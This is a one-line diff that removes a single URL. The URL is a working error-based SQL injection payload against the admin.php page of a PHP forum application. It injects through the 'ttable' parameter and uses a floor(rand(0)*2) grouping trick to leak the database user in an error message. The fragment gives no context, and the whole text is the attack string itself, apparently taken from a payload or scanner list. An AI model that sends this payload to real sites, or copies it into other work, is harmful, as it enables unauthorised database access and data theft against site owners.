@@ -1,1 +1,0 @@
-/admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid=a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),CONCAT(0x3a,(SELECT USER())))a from information_schema.tables group by a)b)%23
